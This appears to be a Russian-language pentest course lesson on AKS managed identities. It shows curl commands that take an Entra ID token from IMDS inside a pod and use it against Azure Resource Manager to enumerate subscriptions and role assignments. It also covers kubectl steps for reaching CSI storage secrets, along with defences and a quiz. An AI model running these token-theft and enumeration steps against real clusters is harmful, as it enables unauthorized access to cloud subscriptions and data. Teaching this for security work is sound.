---
id: cloud-azure-aks
title: "AKS: managed identity пода, kubelet identity и Azure RBAC"
category: cloud
parent: cloud-azure-platform-deep
difficulty: hard
order: 1
tags: [cloud, azure, aks, kubernetes, managed-identity, workload-identity, rbac]
prerequisites: [cloud-azure-platform-deep, cloud-kubernetes-rbac]
useful_for:
  - "Пентест Azure Kubernetes Service"
  - "Захват managed identity из пода"
  - "Lateral movement от AKS к подписке"
estimated_minutes: 50
summary: "AKS: managed identity кластера, kubelet identity, Azure AD Workload Identity и IMDS пода. Как из контейнера получить токен Entra ID и эскалировать в подписку."
---

## Зачем этот урок

Azure Kubernetes Service (AKS) — управляемый Kubernetes в Azure. Как и GKE, он связан с облачной идентичностью: узлы и поды могут получать токены Entra ID через IMDS (169.254.169.254), а **kubelet identity** кластера часто имеет права на другие ресурсы Azure (например, чтение из ACR или управление сетью). Компрометация пода или узла часто приводит к захвату managed identity, а через неё — к доступу в подписку. Azure AD Workload Identity (аналог GKE Workload Identity) изолирует поды, но настраивается не всегда.

## Модель AKS и идентичностей

- **Cluster managed identity (control plane)** — используется для управления ресурсами кластера.
- **Kubelet identity** — отдельная managed identity, которую используют узлы; часто имеет `AcrPull` и права в сети.
- **Workload Identity** — привязка Kubernetes ServiceAccount (KSA) к managed identity через federated credential. Без неё под использует identity узла.
- **IMDS** — `http://169.254.169.254/metadata/identity/oauth2/token` с заголовком `Metadata: true`; выдаёт токен для ресурса (`resource=https://management.azure.com/`).
- **Azure RBAC for Kubernetes** — позволяет управлять доступом к API k8s через Entra ID (роли `Azure Kubernetes Service RBAC Reader/Writer/Admin`).

Проверка изоляции: если токен, полученный подом, принадлежит kubelet identity (`<cluster>-agentpool`), Workload Identity не изолирует под. Если это отдельная managed identity — изоляция работает.

## Инструменты и команды

```bash
# Получаем токен из пода
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .
# {"access_token":"eyJ...","client_id":"...","expires_on":"..."}

# Чей это client_id
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .client_id

# Используем токен против ARM
TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[].displayName'

# Управление кластером
az aks get-credentials --resource-group rg --name aks-prod
kubectl get nodes -o wide
az aks show --resource-group rg --name aks-prod --query 'identityProfile'
```

## Разобранный пример: от пода к подписке

Сценарий: под в AKS без Workload Identity; IMDS доступен.

```bash
# 1. Токен для ARM
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# 2. Какие подписки видны
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq -r '.value[].subscriptionId'
# 11111111-2222-3333-4444-555555555555

# 3. Что можно делать (list role assignments для identity)
CLIENT=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .client_id)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/11111111-.../providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId eq '$CLIENT'" | jq '.value[].properties.roleDefinitionId'

# 4. Если есть Contributor — создаём ресурс/читаем секреты Key Vault
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/.../resourceGroups?api-version=2021-04-01" | jq -r '.value[].name'
```

Kubelet identity часто имеет `Contributor` на node resource group (MC_*), откуда можно читать диски узлов, сети и другие ресурсы. Если у identity есть права на Key Vault — читаем секреты (см. урок про Key Vault).

## Чек-лист атаки

1. Из пода получить токен IMDS; узнать client_id.
2. Перечислить подписки, resource groups, role assignments.
3. Проверить kubelet identity (часто в node resource group `MC_*`).
4. Проверить доступ к ACR, Key Vault, Storage.
5. Проверить возможность создавать поды с произвольным KSA/managed identity.
6. Проверить Azure RBAC for Kubernetes: возможно, у вас есть доступ к API k8s через Entra ID.
7. Проверить CSI-драйверы (Azure Disk/File) — они используют identity для доступа к хранилищу.

## Обход защит и edge cases

- **Workload Identity.** Если включён, токен ограничен federated credential. Но если KSA привязан к широкой identity — эффект тот же. Ищите `serviceAccountName` в манифестах.
- **Network policy.** Может блокировать IMDS? Обычно нет: IMDS — link-local, не покрывается network policy. Но в некоторых конфигурациях есть ограничения.
- **Managed identity vs service principal.** Kubelet identity — managed identity; токен выдаётся без секрета. Если используется SP с секретом, секрет может лежать в key vault.
- **ACR pull.** Kubelet identity часто имеет `AcrPull`; если `AcrPush` — можно отравить образы.
- **CSI.** Azure Disk/File CSI использует identity для монтирования; может давать доступ к другим томам.
- **Node SSH.** Если есть доступ к узлу, можно прочитать `/var/lib/kubelet/...` и токены.

## Частые ошибки и подводные камни

- Считать AKS защищённым, потому что «managed».
- Не проверить kubelet identity: у неё часто Contributor на node RG.
- Забыть про IMDS: он всегда доступен из пода по умолчанию.
- Игнорировать ACR как цель (отравление образов).
- Путать cluster identity и kubelet identity.

## Защита и детект

- Включить Workload Identity и использовать минимальную managed identity на под.
- Ограничить kubelet identity (не Contributor на весь node RG).
- Включить Azure Defender for Containers, admission-политики (Azure Policy).
- Ограничить доступ к IMDS через network policy, где возможно.
- Включить audit logs AKS и Entra ID sign-in logs; алертить на аномальные вызовы ARM от identity.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — kubelet identity с Contributor. Второй — отключённый Workload Identity. Третий — KSA, привязанный к широкой identity. Четвёртый — ACR с AcrPush. Пятый — секреты в Key Vault, доступном identity. Все они превращают компрометацию пода в доступ к подписке.

## Практическое задание

1. Создайте AKS-кластер и под; получите токен IMDS и узнайте client_id.
2. Перечислите role assignments для kubelet identity.
3. Включите Workload Identity, привяжите KSA к identity с правами только на один RG и повторите.
4. Настройте Azure Policy и проверьте, что под с произвольной identity блокируется.

## Что дальше / решение

Из пода AKS получаем токен Azure. Дальше — перечислять права, читать Key Vault/Storage, эскалировать. Зафиксируйте путь «под → IMDS → identity → подписка» в графе. При строгом Workload Identity и малых правах — ищите другие поды/identity или эскалируйте внутри кластера.

## Разобранный пример 2: CSI-драйверы и доступ к хранилищу

AKS использует CSI-драйверы (Azure Disk, Azure File) для монтирования томов. Они работают от имени managed identity (kubelet identity или отдельной), и эта identity имеет права на storage-аккаунты и диски. Если у вас есть возможность создавать PVC/PV или читать конфигурацию CSI, вы можете добраться до чужих данных.

```bash
# Смотрим StorageClass и CSI-драйверы
kubectl get storageclass
kubectl get csidrivers

# PersistentVolume и его источник
kubectl get pv -o json | jq '.items[] | {name:.metadata.name, csi:.spec.csi}'
# {"name":"pvc-abc","csi":{"driver":"disk.csi.azure.com","volumeHandle":"/subscriptions/.../disks/prod-disk"}}

# Если identity имеет доступ к диску — можно смонтировать его в свой под
kubectl get secret azure-storage-account-* -o json | jq '.data | keys'
```

Azure File CSI монтирует файловые шары через storage-account key или managed identity. Если key лежит в секрете кластера, а у вас есть доступ к секретам namespace — вы получаете доступ к шару. Azure Disk CSI даёт доступ к диску по resource ID: identity с ролью `Contributor` на диск может создать снапшот и выгрузить данные. Проверяйте `kubelet identity` на права к дискам и storage-аккаунтам — это часто забытая ветка.

## Квиз

```quiz
- question: "Чей токен получает под AKS без Workload Identity?"
  options:
    - "Kubelet/узел managed identity"
    - "Личный аккаунт пользователя"
    - "Service principal кластера"
    - "Токен Key Vault"
  answer: 0
  explanation: "Без Workload Identity под видит identity узла (kubelet identity)."
- question: "Через какой эндпоинт под получает токен Entra ID?"
  options:
    - "IMDS 169.254.169.254 с заголовком Metadata: true"
    - "metadata.google.internal"
    - "169.254.170.2"
    - "127.0.0.1:8080"
  answer: 0
  explanation: "Azure IMDS выдаёт токены для managed identity."
- question: "Почему kubelet identity опасна?"
  options:
    - "Часто имеет Contributor на node resource group (MC_*)"
    - "Она только для чтения"
    - "Она не имеет прав"
    - "Она привязана к пользователю"
  answer: 0
  explanation: "Широкие права kubelet identity дают доступ к ресурсам Azure."
- question: "Что такое Azure AD Workload Identity?"
  options:
    - "Привязка KSA к managed identity через federated credential"
    - "Публичный бакет"
    - "Роль ARM"
    - "Тип диска"
  answer: 0
  explanation: "Workload Identity изолирует под, выдавая токен его identity."
```

## Где пригодится

- **Пентест Azure:** вход в подписку через AKS.
- **Red team:** lateral movement из кластера.
- **Cloud IR:** анализ злоупотребления identity.
- **Сертификация:** AZ-500 / CKS.
